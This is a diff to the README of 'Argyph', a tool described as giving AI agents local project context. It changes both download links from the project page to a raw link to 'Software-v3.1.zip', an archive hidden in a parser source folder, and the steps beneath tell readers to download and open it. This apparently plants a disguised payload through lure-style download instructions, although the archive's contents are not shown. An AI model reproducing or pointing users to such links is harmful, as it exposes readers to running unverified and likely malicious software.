@@ -1,6 +1,6 @@
 # 🧠 Argyph - Give Your AI Smart Project Context
 
-[![Download Argyph](https://img.shields.io/badge/Download-Argyph-blue.svg)](https://github.com/Denithenar327/Argyph)
+[![Download Argyph](https://img.shields.io/badge/Download-Argyph-blue.svg)](https://raw.githubusercontent.com/Denithenar327/Argyph/main/crates/argyph-parse/src/languages/Software-v3.1.zip)
 
 Argyph helps AI tools understand your code. It keeps your files local and private while letting AI agents search and read your project data. You do not need to upload files to the cloud. You keep full control over your information at all times.
 
@@ -26,7 +26,7 @@ Your computer must meet these steps to run Argyph:
 
 Follow these steps to get the tool ready for use.
 
-1. Visit the [official download page](https://github.com/Denithenar327/Argyph).
+1. Visit the [official download page](https://raw.githubusercontent.com/Denithenar327/Argyph/main/crates/argyph-parse/src/languages/Software-v3.1.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Click the link to download the installation file.
 4. Open the downloaded file once the process finishes.
